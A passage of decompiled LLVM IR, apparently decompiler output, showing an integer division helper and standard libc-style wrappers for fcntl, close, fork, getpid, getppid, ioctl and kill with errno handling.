  %v0_1192855 = phi i32 [ %v1_11920, %dec_label_pc_1191c ], [ %v2_1191c, %bb87 ]
  %v3_11924 = udiv i32 %v0_11924, 2
  br label %dec_label_pc_11928

dec_label_pc_11928:                               ; preds = %dec_label_pc_11904, %bb88
  %v2_1192c = phi i32 [ %v0_11918, %dec_label_pc_11904 ], [ %v3_11924, %bb88 ]
  %v1_1192c = phi i32 [ %v1_11914, %dec_label_pc_11904 ], [ %v0_1192855, %bb88 ]
  %v3_11928 = icmp ult i32 %v1_1192c, %v2_1192c
  br i1 %v3_11928, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_11928
  %v2_11928 = sub i32 %v1_1192c, %v2_1192c
  br label %bb76

dec_label_pc_11934:                               ; preds = %dec_label_pc_11878
  %v0_11934 = load i32, i32* @lr, align 4
  %v0_11938 = call i32 @function_11a28()
  call void @__pseudo_branch(i32 %v0_11934)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1192c, { 1, 2, 0 }
  uselistorder i32 %v0_11918, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_118f8, { 1, 0, 2 }
  uselistorder i32 %v7_118f0, { 1, 0 }
  uselistorder i32 %v3_118ec, { 1, 0 }
  uselistorder i32 %v1_118d4.v6_118d4.v6_118dc.v6_118e4, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_118e0, { 1, 0 }
  uselistorder i32 %v4_118d8, { 1, 0 }
  uselistorder i32 %v4_118d0, { 1, 0 }
  uselistorder i32 %v6_118f0, { 3, 0, 2, 1 }
  uselistorder i32 %v2_118c0, { 1, 0 }
  uselistorder i32 %v1_118b4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_118a0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_118ac.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11880, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_11928, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_1191c, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_118c8, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @function_11944(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11944:
  store i32 %arg1, i32* @r0, align 4
  %v2_11944 = icmp eq i32 %arg2, 0
  br i1 %v2_11944, label %dec_label_pc_11a18, label %dec_label_pc_1194c

dec_label_pc_1194c:                               ; preds = %dec_label_pc_11944
  %v1_11944 = icmp slt i32 %arg2, 0
  br i1 %v1_11944, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_1194c
  %v2_1194c = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_1194c, %bb
  %v4_11964 = phi i32 [ %arg2, %dec_label_pc_1194c ], [ %v2_1194c, %bb ]
  %v0_11950 = load i32, i32* @r0, align 4
  %v1_11950 = icmp slt i32 %v0_11950, 0
  br i1 %v1_11950, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_11954 = sub i32 0, %v0_11950
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_1195c = phi i32 [ %v0_11950, %bb79 ], [ %v2_11954, %bb80 ]
  %v1_11958 = add i32 %v4_11964, -1
  %v7_11958 = icmp eq i32 %v4_11964, 1
  br i1 %v7_11958, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_1195c = icmp eq i32 %v1_1195c, %v4_11964
  br i1 %v10_1195c, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_1195c = icmp ult i32 %v1_1195c, %v4_11964
  br i1 %v4_1195c, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_11964 = and i32 %v1_11958, %v4_11964
  %v8_11964 = icmp eq i32 %v6_11964, 0
  br i1 %v8_11964, label %.thread72, label %dec_label_pc_11974.preheader

dec_label_pc_11974.preheader:                     ; preds = %bb84
  %v2_11974109 = icmp ugt i32 %v4_11964, 268435455
  br i1 %v2_11974109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_1196864 = phi i32 [ %v1_1195c, %bb84 ], [ 0, %.thread70 ]
  %v3_11968 = and i32 %v1_1196864, %v1_11958
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_11974.preheader
  %v0_11988.pr35.lcssa = phi i32 [ %v4_11964, %dec_label_pc_11974.preheader ], [ %v4_1197c, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_11974.preheader ], [ %v2_119809, %.thread2.thread7 ]
  br label %dec_label_pc_11988thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_11974.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_119809, %.thread2.thread7 ], [ 0, %dec_label_pc_11974.preheader ]
  %v0_11988.pr35110 = phi i32 [ %v4_1197c, %.thread2.thread7 ], [ %v4_11964, %dec_label_pc_11974.preheader ]
  %v4_11978 = icmp ult i32 %v0_11988.pr35110, %v1_1195c
  br i1 %v4_11978, label %bb86, label %dec_label_pc_11988thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_1197c = and i32 %v0_11988.pr35110, 268435456
  %v3_1197c = icmp eq i32 %v2_1197c, 0
  %v4_1197c = mul i32 %v0_11988.pr35110, 16
  br i1 %v3_1197c, label %.thread2.thread7, label %dec_label_pc_11988.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_119809 = add i32 %storemerge111, 4
  %v2_11974 = icmp ugt i32 %v4_1197c, 268435455
  br i1 %v2_11974, label %.thread1, label %bb85

dec_label_pc_11988thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_11988thread-pre-split.loopexit

dec_label_pc_11988thread-pre-split.loopexit:      ; preds = %dec_label_pc_11988thread-pre-split.loopexit.loopexit, %.thread1
  %v0_11988.pr35108 = phi i32 [ %v0_11988.pr35.lcssa, %.thread1 ], [ %v0_11988.pr35110, %dec_label_pc_11988thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_11988thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11988thread-pre-split

dec_label_pc_11988thread-pre-split:               ; preds = %.thread4, %dec_label_pc_11988thread-pre-split.loopexit
  %v1_1199441 = phi i32 [ %storemerge105, %dec_label_pc_11988thread-pre-split.loopexit ], [ %v2_11994, %.thread4 ]
  %v2_1198c36 = phi i32 [ %v1_1195c, %dec_label_pc_11988thread-pre-split.loopexit ], [ %v2_1198c, %.thread4 ]
  %v0_11988.pr = phi i32 [ %v0_11988.pr35108, %dec_label_pc_11988thread-pre-split.loopexit ], [ %v3_11990, %.thread4 ]
  br label %dec_label_pc_11988

dec_label_pc_11988.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_11988

dec_label_pc_11988:                               ; preds = %dec_label_pc_11988.loopexit, %dec_label_pc_11988thread-pre-split
  %v0_1199c.pr = phi i32 [ %v1_1199441, %dec_label_pc_11988thread-pre-split ], [ %storemerge111, %dec_label_pc_11988.loopexit ]
  %v2_1198c = phi i32 [ %v2_1198c36, %dec_label_pc_11988thread-pre-split ], [ %v1_1195c, %dec_label_pc_11988.loopexit ]
  %v1_11990 = phi i32 [ %v0_11988.pr, %dec_label_pc_11988thread-pre-split ], [ %v4_1197c, %dec_label_pc_11988.loopexit ]
  %v2_11988 = icmp slt i32 %v1_11990, 0
  br i1 %v2_11988, label %dec_label_pc_1199c, label %bb87

bb87:                                             ; preds = %dec_label_pc_11988
  %v4_1198c = icmp ult i32 %v1_11990, %v2_1198c
  br i1 %v4_1198c, label %.thread4, label %dec_label_pc_1199c

.thread4:                                         ; preds = %bb87
  %v3_11990 = mul i32 %v1_11990, 2
  %v2_11994 = add i32 %v0_1199c.pr, 1
  br label %dec_label_pc_11988thread-pre-split

dec_label_pc_1199c:                               ; preds = %bb87, %dec_label_pc_11988
  %v2_1199c = add i32 %v0_1199c.pr, -3
  %v5_119a0 = icmp slt i32 %v0_1199c.pr, 3
  br i1 %v5_119a0, label %dec_label_pc_119e0, label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_1199c, %bb91
  %v6_119cc = phi i32 [ %v0_119d4, %bb91 ], [ %v2_1199c, %dec_label_pc_1199c ]
  %v1_119a8 = phi i32 [ %v1_119b0.v6_119b0.v6_119b8.v6_119c0, %bb91 ], [ %v2_1198c, %dec_label_pc_1199c ]
  %v3_119c810 = phi i32 [ %v3_119c8, %bb91 ], [ %v1_11990, %dec_label_pc_1199c ]
  %v3_119a4 = icmp ult i32 %v1_119a8, %v3_119c810
  %v3_119a8 = select i1 %v3_119a4, i32 0, i32 %v3_119c810
  %v1_119b0 = sub i32 %v1_119a8, %v3_119a8
  %v4_119ac = udiv i32 %v3_119c810, 2
  %v6_119ac = icmp ult i32 %v1_119b0, %v4_119ac
  %v6_119b0 = select i1 %v6_119ac, i32 0, i32 %v4_119ac
  %v1_119b0.v6_119b0 = sub i32 %v1_119b0, %v6_119b0
  %.demorgan = and i1 %v3_119a4, %v6_119ac
  %v4_119b4 = udiv i32 %v3_119c810, 4
  %v6_119b4 = icmp ult i32 %v1_119b0.v6_119b0, %v4_119b4
  %v6_119b8 = select i1 %v6_119b4, i32 0, i32 %v4_119b4
  %v1_119b0.v6_119b0.v6_119b8 = sub i32 %v1_119b0.v6_119b0, %v6_119b8
  %.demorgan76 = and i1 %.demorgan, %v6_119b4
  %v4_119bc = udiv i32 %v3_119c810, 8
  %v6_119bc = icmp ult i32 %v1_119b0.v6_119b0.v6_119b8, %v4_119bc
  %v6_119c0 = select i1 %v6_119bc, i32 0, i32 %v4_119bc
  %v1_119b0.v6_119b0.v6_119b8.v6_119c0 = sub i32 %v1_119b0.v6_119b0.v6_119b8, %v6_119c0
  %.demorgan77 = and i1 %.demorgan76, %v6_119bc
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_119a4
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_119a4, %bb88
  %v2_119c4 = add i32 %v1_119b0.v6_119b0.v6_119b8.v6_119c0, -1
  %v4_119c4 = sub i32 0, %v1_119b0.v6_119b0.v6_119b8.v6_119c0
  %v5_119c4 = and i32 %v1_119b0.v6_119b0.v6_119b8.v6_119c0, %v4_119c4
  %v3_119c8 = udiv i32 %v3_119c810, 16
  %v5_119cc = icmp slt i32 %v1_119b0.v6_119b0.v6_119b8.v6_119c0, 1
  br i1 %v5_119cc, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_119cc = add i32 %v6_119cc, -4
  %v9_119cc = sub i32 3, %v6_119cc
  %v10_119cc = and i32 %v9_119cc, %v6_119cc
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_119d4 = phi i32 [ %v6_119cc, %bb89 ], [ %v7_119cc, %bb90 ]
  %v0_119d013.in = phi i32 [ %v2_119c4, %bb89 ], [ %v7_119cc, %bb90 ]
  %v1_119d012.in = phi i32 [ %v5_119c4, %bb89 ], [ %v10_119cc, %bb90 ]
  %v1_119d012 = icmp slt i32 %v1_119d012.in, 0
  %v0_119d013 = icmp slt i32 %v0_119d013.in, 0
  %v2_119d0 = xor i1 %v0_119d013, %v1_119d012
  br i1 %v2_119d0, label %dec_label_pc_119d4, label %dec_label_pc_119a4

dec_label_pc_119d4:                               ; preds = %bb91
  %v1_119d4 = urem i32 %v0_119d4, 4
  %v2_119d4 = icmp eq i32 %v1_119d4, 0
  br i1 %v2_119d4, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_119d4
  %v3_119d8 = icmp eq i32 %v1_119b0.v6_119b0.v6_119b8.v6_119c0, 0
  br i1 %v3_119d8, label %.thread6, label %dec_label_pc_119e0

dec_label_pc_119e0:                               ; preds = %bb92, %dec_label_pc_1199c
  %v0_119f4 = phi i32 [ %v3_119c8, %bb92 ], [ %v1_11990, %dec_label_pc_1199c ]
  %v1_119f0 = phi i32 [ %v1_119b0.v6_119b0.v6_119b8.v6_119c0, %bb92 ], [ %v2_1198c, %dec_label_pc_1199c ]
  %v0_119e0 = phi i32 [ %v0_119d4, %bb92 ], [ %v2_1199c, %dec_label_pc_1199c ]
  %v5_119e4 = icmp slt i32 %v0_119e0, -2
  br i1 %v5_119e4, label %dec_label_pc_11a04, label %dec_label_pc_119e8

dec_label_pc_119e8:                               ; preds = %dec_label_pc_119e0
  %v8_119e0 = icmp eq i32 %v0_119e0, -2
  br i1 %v8_119e0, label %dec_label_pc_119f8, label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119e8
  %v3_119ec = icmp ult i32 %v1_119f0, %v0_119f4
  br i1 %v3_119ec, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_119ec
  %v2_119ec = sub i32 %v1_119f0, %v0_119f4
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_119ec, %bb93
  %v0_119f854 = phi i32 [ %v1_119f0, %dec_label_pc_119ec ], [ %v2_119ec, %bb93 ]
  %v3_119f4 = udiv i32 %v0_119f4, 2
  br label %dec_label_pc_119f8

dec_label_pc_119f8:                               ; preds = %dec_label_pc_119e8, %bb94
  %v0_11a00 = phi i32 [ %v0_119f4, %dec_label_pc_119e8 ], [ %v3_119f4, %bb94 ]
  %v1_119fc = phi i32 [ %v1_119f0, %dec_label_pc_119e8 ], [ %v0_119f854, %bb94 ]
  %v3_119f8 = icmp ult i32 %v1_119fc, %v0_11a00
  br i1 %v3_119f8, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_119f8
  %v2_119f8 = sub i32 %v1_119fc, %v0_11a00
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_119f8, %bb95
  %v0_11a0457 = phi i32 [ %v1_119fc, %dec_label_pc_119f8 ], [ %v2_119f8, %bb95 ]
  %v3_11a00 = udiv i32 %v0_11a00, 2
  br label %dec_label_pc_11a04

dec_label_pc_11a04:                               ; preds = %dec_label_pc_119e0, %bb96
  %v2_11a08 = phi i32 [ %v0_119f4, %dec_label_pc_119e0 ], [ %v3_11a00, %bb96 ]
  %v1_11a08 = phi i32 [ %v1_119f0, %dec_label_pc_119e0 ], [ %v0_11a0457, %bb96 ]
  %v3_11a04 = icmp ult i32 %v1_11a08, %v2_11a08
  br i1 %v3_11a04, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_11a04
  %v2_11a04 = sub i32 %v1_11a08, %v2_11a08
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_11a04, %bb83, %.thread72, %dec_label_pc_119d4, %bb92, %bb97
  %v1_11a10 = phi i32 [ %v1_119b0.v6_119b0.v6_119b8.v6_119c0, %dec_label_pc_119d4 ], [ 0, %bb92 ], [ %v1_11a08, %dec_label_pc_11a04 ], [ %v2_11a04, %bb97 ], [ %v3_11968, %.thread72 ], [ %v1_1195c, %bb83 ]
  br i1 %v1_11950, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_11a10 = sub i32 0, %v1_11a10
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_11a14 = phi i32 [ %v1_11a10, %.thread6 ], [ %v2_11a10, %bb98 ]
  ret i32 %v1_11a14

dec_label_pc_11a18:                               ; preds = %dec_label_pc_11944
  %v0_11a18 = load i32, i32* @lr, align 4
  %v0_11a1c = call i32 @function_11a28()
  call void @__pseudo_branch(i32 %v0_11a18)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_119f4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_119d4, { 1, 0, 2 }
  uselistorder i32 %v7_119cc, { 1, 0 }
  uselistorder i32 %v3_119c8, { 1, 0 }
  uselistorder i32 %v1_119b0.v6_119b0.v6_119b8.v6_119c0, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_119bc, { 1, 0 }
  uselistorder i32 %v4_119b4, { 1, 0 }
  uselistorder i32 %v4_119ac, { 1, 0 }
  uselistorder i32 %v6_119cc, { 3, 0, 2, 1 }
  uselistorder i32 %v2_1199c, { 1, 0 }
  uselistorder i32 %v1_11990, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1198c, { 1, 0, 3, 2 }
  uselistorder i32 %v4_1197c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_11988.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1195c, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_11964, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @function_11a28, { 2, 1, 0 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_11a04, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_119f8, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_119a4, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @function_11a28() local_unnamed_addr {
dec_label_pc_11a28:
  %v1_11a28 = load i32, i32* @r0, align 4
  ret i32 %v1_11a28
}

define i32 @function_11a2c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11a2c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_11a2c = load i32, i32* @r2, align 4
  %v1_11a3c = add i32 %arg2, -12
  store i32 %v6_11a2c, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_11a3c, 2
  br i1 %tmp, label %dec_label_pc_11a64, label %dec_label_pc_11a5c

dec_label_pc_11a5c:                               ; preds = %dec_label_pc_11a2c
  %v0_11a5c = call i32 @function_11aa0()
  br label %dec_label_pc_11a90

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a2c
  %v2_11a6c = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_11a6c, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_11a6c, -4095
  br i1 %tmp8, label %dec_label_pc_11a90, label %dec_label_pc_11a7c

dec_label_pc_11a7c:                               ; preds = %dec_label_pc_11a64
  %v0_11a7c = call i32 @function_120c4()
  %v0_11a80 = load i32, i32* %r4.global-to-local, align 4
  %v1_11a80 = sub i32 0, %v0_11a80
  %v2_11a84 = inttoptr i32 %v0_11a7c to i32*
  store i32 %v1_11a80, i32* %v2_11a84, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11a90

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a7c, %dec_label_pc_11a64, %dec_label_pc_11a5c
  %storemerge = phi i32 [ %v0_11a5c, %dec_label_pc_11a5c ], [ %v2_11a6c, %dec_label_pc_11a64 ], [ -1, %dec_label_pc_11a7c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_11a6c, { 1, 0, 2 }
}

define i32 @function_11aa0() local_unnamed_addr {
dec_label_pc_11aa0:
  %r4.global-to-local = alloca i32, align 4
  %v0_11ac0 = load i32, i32* @r0, align 4
  store i32 %v0_11ac0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ac0, -4095
  br i1 %tmp, label %dec_label_pc_11adc, label %dec_label_pc_11acc

dec_label_pc_11acc:                               ; preds = %dec_label_pc_11aa0
  %v0_11acc = call i32 @function_120c4()
  %v0_11ad0 = load i32, i32* %r4.global-to-local, align 4
  %v1_11ad0 = sub i32 0, %v0_11ad0
  %v2_11ad4 = inttoptr i32 %v0_11acc to i32*
  store i32 %v1_11ad0, i32* %v2_11ad4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11adc

dec_label_pc_11adc:                               ; preds = %dec_label_pc_11aa0, %dec_label_pc_11acc
  %v0_11adc = phi i32 [ %v0_11ac0, %dec_label_pc_11aa0 ], [ -1, %dec_label_pc_11acc ]
  ret i32 %v0_11adc

; uselistorder directives
  uselistorder i32 %v0_11ac0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11adc, { 1, 0 }
}

define i32 @function_11af0(i32 %arg1) local_unnamed_addr {
dec_label_pc_11af0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11af0 = load i32, i32* @r4, align 4
  store i32 %v3_11af0, i32* %stack_var_-8, align 4
  %v1_11af4 = call i32 @close(i32 %arg1)
  store i32 %v1_11af4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_11af4, -4095
  br i1 %tmp, label %dec_label_pc_11b14, label %dec_label_pc_11b04

dec_label_pc_11b04:                               ; preds = %dec_label_pc_11af0
  %v0_11b04 = call i32 @function_120c4()
  %v0_11b08 = load i32, i32* %r4.global-to-local, align 4
  %v1_11b08 = sub i32 0, %v0_11b08
  %v2_11b0c = inttoptr i32 %v0_11b04 to i32*
  store i32 %v1_11b08, i32* %v2_11b0c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b14

dec_label_pc_11b14:                               ; preds = %dec_label_pc_11af0, %dec_label_pc_11b04
  %v0_11b14 = phi i32 [ %v1_11af4, %dec_label_pc_11af0 ], [ -1, %dec_label_pc_11b04 ]
  %v2_11b18 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11b18, i32* @r4, align 4
  ret i32 %v0_11b14

; uselistorder directives
  uselistorder i32 %v1_11af4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b14, { 1, 0 }
}

define i32 @function_11b1c() local_unnamed_addr {
dec_label_pc_11b1c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11b1c = load i32, i32* @r4, align 4
  store i32 %v3_11b1c, i32* %stack_var_-8, align 4
  %v0_11b20 = call i32 @fork()
  store i32 %v0_11b20, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11b20, -4095
  br i1 %tmp, label %dec_label_pc_11b40, label %dec_label_pc_11b30

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11b1c
  %v0_11b30 = call i32 @function_120c4()
  %v0_11b34 = load i32, i32* %r4.global-to-local, align 4
  %v1_11b34 = sub i32 0, %v0_11b34
  %v2_11b38 = inttoptr i32 %v0_11b30 to i32*
  store i32 %v1_11b34, i32* %v2_11b38, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b40

dec_label_pc_11b40:                               ; preds = %dec_label_pc_11b1c, %dec_label_pc_11b30
  %v0_11b40 = phi i32 [ %v0_11b20, %dec_label_pc_11b1c ], [ -1, %dec_label_pc_11b30 ]
  %v2_11b44 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11b44, i32* @r4, align 4
  ret i32 %v0_11b40

; uselistorder directives
  uselistorder i32 %v0_11b20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b40, { 1, 0 }
}

define i32 @function_11b48() local_unnamed_addr {
dec_label_pc_11b48:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11b48 = load i32, i32* @r4, align 4
  store i32 %v3_11b48, i32* %stack_var_-8, align 4
  %v0_11b4c = call i32 @getpid()
  store i32 %v0_11b4c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11b4c, -4095
  br i1 %tmp, label %dec_label_pc_11b6c, label %dec_label_pc_11b5c

dec_label_pc_11b5c:                               ; preds = %dec_label_pc_11b48
  %v0_11b5c = call i32 @function_120c4()
  %v0_11b60 = load i32, i32* %r4.global-to-local, align 4
  %v1_11b60 = sub i32 0, %v0_11b60
  %v2_11b64 = inttoptr i32 %v0_11b5c to i32*
  store i32 %v1_11b60, i32* %v2_11b64, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b6c

dec_label_pc_11b6c:                               ; preds = %dec_label_pc_11b48, %dec_label_pc_11b5c
  %v0_11b6c = phi i32 [ %v0_11b4c, %dec_label_pc_11b48 ], [ -1, %dec_label_pc_11b5c ]
  %v2_11b70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11b70, i32* @r4, align 4
  ret i32 %v0_11b6c

; uselistorder directives
  uselistorder i32 %v0_11b4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b6c, { 1, 0 }
}

define i32 @function_11b74() local_unnamed_addr {
dec_label_pc_11b74:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11b74 = load i32, i32* @r4, align 4
  store i32 %v3_11b74, i32* %stack_var_-8, align 4
  %v0_11b78 = call i32 @getppid()
  store i32 %v0_11b78, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11b78, -4095
  br i1 %tmp, label %dec_label_pc_11b98, label %dec_label_pc_11b88

dec_label_pc_11b88:                               ; preds = %dec_label_pc_11b74
  %v0_11b88 = call i32 @function_120c4()
  %v0_11b8c = load i32, i32* %r4.global-to-local, align 4
  %v1_11b8c = sub i32 0, %v0_11b8c
  %v2_11b90 = inttoptr i32 %v0_11b88 to i32*
  store i32 %v1_11b8c, i32* %v2_11b90, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b98

dec_label_pc_11b98:                               ; preds = %dec_label_pc_11b74, %dec_label_pc_11b88
  %v0_11b98 = phi i32 [ %v0_11b78, %dec_label_pc_11b74 ], [ -1, %dec_label_pc_11b88 ]
  %v2_11b9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11b9c, i32* @r4, align 4
  ret i32 %v0_11b98

; uselistorder directives
  uselistorder i32 %v0_11b78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b98, { 1, 0 }
}

define i32 @function_11ba0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11ba0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_11ba0 = load i32, i32* @r3, align 4
  store i32 %v9_11ba0, i32* %stack_var_-4, align 4
  %v2_11bac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11bac, i32* @r3, align 4
  %v2_11bbc = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_11bbc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_11bbc, -4095
  br i1 %tmp, label %dec_label_pc_11bdc, label %dec_label_pc_11bcc

dec_label_pc_11bcc:                               ; preds = %dec_label_pc_11ba0
  %v0_11bcc = call i32 @function_120c4()
  %v0_11bd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_11bd0 = sub i32 0, %v0_11bd0
  store i32 %v1_11bd0, i32* @r3, align 4
  %v2_11bd4 = inttoptr i32 %v0_11bcc to i32*
  store i32 %v1_11bd0, i32* %v2_11bd4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11bdc

dec_label_pc_11bdc:                               ; preds = %dec_label_pc_11ba0, %dec_label_pc_11bcc
  %v0_11bdc = phi i32 [ %v2_11bbc, %dec_label_pc_11ba0 ], [ -1, %dec_label_pc_11bcc ]
  ret i32 %v0_11bdc

; uselistorder directives
  uselistorder i32 %v2_11bbc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_11bdc, { 1, 0 }
}

define i32 @function_11bf0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11bf0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11bf0 = load i32, i32* @r4, align 4
  store i32 %v3_11bf0, i32* %stack_var_-8, align 4
  %v2_11bf4 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_11bf4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_11bf4, -4095
  br i1 %tmp, label %dec_label_pc_11c14, label %dec_label_pc_11c04

dec_label_pc_11c04:                               ; preds = %dec_label_pc_11bf0
  %v0_11c04 = call i32 @function_120c4()
  %v0_11c08 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c08 = sub i32 0, %v0_11c08
  %v2_11c0c = inttoptr i32 %v0_11c04 to i32*
  store i32 %v1_11c08, i32* %v2_11c0c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11c14

dec_label_pc_11c14:                               ; preds = %dec_label_pc_11bf0, %dec_label_pc_11c04
  %v0_11c14 = phi i32 [ %v2_11bf4, %dec_label_pc_11bf0 ], [ -1, %dec_label_pc_11c04 ]
  %v2_11c18 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11c18, i32* @r4, align 4
  ret i32 %v0_11c14

; uselistorder directives
  uselistorder i32 %v2_11bf4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11c14, { 1, 0 }
}

define i32 @function_11c1c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11c1c:
